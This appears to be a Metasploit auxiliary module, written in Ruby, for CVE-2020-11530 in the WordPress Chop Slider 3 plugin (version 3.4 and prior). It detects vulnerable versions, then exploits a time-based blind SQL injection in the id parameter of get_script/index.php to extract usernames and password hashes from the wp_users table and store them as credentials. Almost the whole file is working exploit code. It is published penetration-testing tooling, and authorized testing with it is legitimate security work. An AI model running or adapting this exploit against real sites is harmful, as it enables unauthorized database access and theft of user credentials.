##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  require 'metasploit/framework/hashes/identify'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress ChopSlider3 id SQLi Scanner',
        'Description' => %q{
          The iDangero.us Chop Slider 3 WordPress plugin version 3.4 and prior
          contains a blind SQL injection in the id parameter of the
          get_script/index.php page.  The injection is passed through GET
          parameters, and thus must be encoded,
          and magic_quotes is applied at the server.
        },
        'Author' => [
          'h00die', # msf module
          'SunCSR', # edb module
          'Callum Murphy <callum.a.murphy.77@gmail.com>' # full disclosure
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['EDB', '48457'],
          ['CVE', '2020-11530'],
          ['URL', 'https://seclists.org/fulldisclosure/2020/May/26']
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2020-05-12'
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1]),
    ]
  end

  def check
    res = send_request_raw({
      'method' => 'GET',
      'uri' => target_uri.path
    })
    fail_with Failure::Unreachable, 'Connection failed' unless res
    if res && res.body =~ /idangerous.chopslider-(\d\.\d).css-css/
      v = Rex::Version.new(Regexp.last_match(1))
      print_status "Version detected: #{v}"
      if v <= Rex::Version.new('3.4')
        return Msf::Exploit::CheckCode::Appears
      end
    end
    Msf::Exploit::CheckCode::Unknown
  end

  def run_host(ip)
    unless wordpress_and_online?
      vprint_error('Server not online or not detected as wordpress')
      return
    end

    # this didn't come with a readme file
    # checkcode = check_plugin_version_from_readme('chopslider', '3.4')

    if check == Msf::Exploit::CheckCode::Unknown
      vprint_error('ChopSlider3 version not vulnerable or undetected')
      return
    else
      print_good('Vulnerable version detected')
    end

    sliderid = Rex::Text.rand_text_numeric(8..10)

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      if payload.include?("''")
        payload.gsub!("''", 'hex(0x00)')
      end

      payload = Rex::Text.uri_encode(payload)
      res = send_request_raw({
        'method' => 'GET',
        'uri' => "#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'chopslider', 'get_script', 'index.php')}?id=#{sliderid}%20OR%20#{rand(0..10)}<>#{rand(11..1000)}%20AND%20#{payload}"
      }, 20, true)
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end
    columns = ['user_login', 'user_pass']

    print_status('Enumerating Usernames')
    un = @sqli.dump_table_fields('wp_users', [columns[0]], '', datastore['COUNT'])

    print_status('Enumerating Password Hashes')
    pass = @sqli.dump_table_fields('wp_users', [columns[1]], '', datastore['COUNT'])

    un = un.zip(pass)

    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    un.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << [user[0][0], user[1][0]]
    end
    print_good(table.to_s)
  end
end
